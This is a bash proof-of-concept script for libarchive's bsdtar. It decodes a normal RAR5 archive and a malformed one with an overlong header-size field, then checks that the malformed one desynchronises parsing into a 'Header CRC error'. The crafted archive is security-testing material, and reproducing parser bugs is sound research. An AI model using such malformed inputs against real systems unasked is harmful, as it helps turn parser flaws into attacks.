#!/usr/bin/env bash
set -u

BSDTAR="${BSDTAR:-/opt/libarchive/build/bin/bsdtar}"
POC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORK_DIR="$POC_DIR/generated"

mkdir -p "$WORK_DIR"

normal="$WORK_DIR/c001_normal_with_original_file_tail.rar"
overlong="$WORK_DIR/c001_overlong_with_original_file_tail.rar"

base64 -d > "$normal" <<'B64'
UmFyIRoHAQDFGjMyAwEAADgwBmMsAgMLnQAEnQCkgwK0Q6CVgAABDmhlbGxvd29ybGQudHh0CgMTfg6rW1bpDhpoZWxsbyBsaWJhcmNoaXZlIHRlc3Qgc3VpdGUhCh13VlEDBQQA
B64

base64 -d > "$overlong" <<'B64'
UmFyIRoHAQDk/8bICgEAgICAgICAgIA4MAZjLAIDC50ABJ0ApIMCtEOglYAAAQ5oZWxsb3dvcmxkLnR4dAoDE34Oq1tW6Q4aaGVsbG8gbGliYXJjaGl2ZSB0ZXN0IHN1aXRlIQodd1ZRAwUEAA==
B64

export ASAN_OPTIONS="${ASAN_OPTIONS:+$ASAN_OPTIONS:}detect_leaks=0"

run_case() {
  local label="$1"
  local archive="$2"
  local attempt="$3"
  local stdout_file="$WORK_DIR/$label.stdout"
  local stderr_file="$WORK_DIR/$label.stderr"
  local status

  "$BSDTAR" -tvf "$archive" > "$stdout_file" 2> "$stderr_file"
  status=$?

  printf '== %s attempt %s ==\n' "$label" "$attempt"
  printf 'archive=%s\n' "$archive"
  printf 'sha256='
  sha256sum "$archive" | awk '{print $1}'
  printf 'exit_status=%s\n' "$status"
  printf -- '-- stdout --\n'
  sed 's/^/  /' "$stdout_file"
  printf -- '-- stderr --\n'
  sed 's/^/  /' "$stderr_file"
  printf '\n'

  return "$status"
}

normal_status=1
for attempt in 1 2 3 4 5; do
  run_case normal "$normal" "$attempt"
  normal_status=$?

  if [ "$normal_status" -eq 0 ] &&
     grep -q 'helloworld.txt' "$WORK_DIR/normal.stdout"; then
    break
  fi

  sleep 0.05
done

overlong_status=1
for attempt in 1 2 3 4 5; do
  run_case overlong "$overlong" "$attempt"
  overlong_status=$?

  if [ "$overlong_status" -ne 0 ] &&
     grep -q 'Header CRC error' "$WORK_DIR/overlong.stderr"; then
    break
  fi

  sleep 0.05
done

if [ "$normal_status" -eq 0 ] &&
   grep -q 'helloworld.txt' "$WORK_DIR/normal.stdout" &&
   [ "$overlong_status" -ne 0 ] &&
   grep -q 'Header CRC error' "$WORK_DIR/overlong.stderr"; then
  printf 'PoC result: PASS - malformed RAR5 input desynchronizes parsing and reaches Header CRC error while the control lists normally.\n'
  exit 0
fi

printf 'PoC result: FAIL - expected control success and malformed Header CRC error.\n' >&2
exit 1
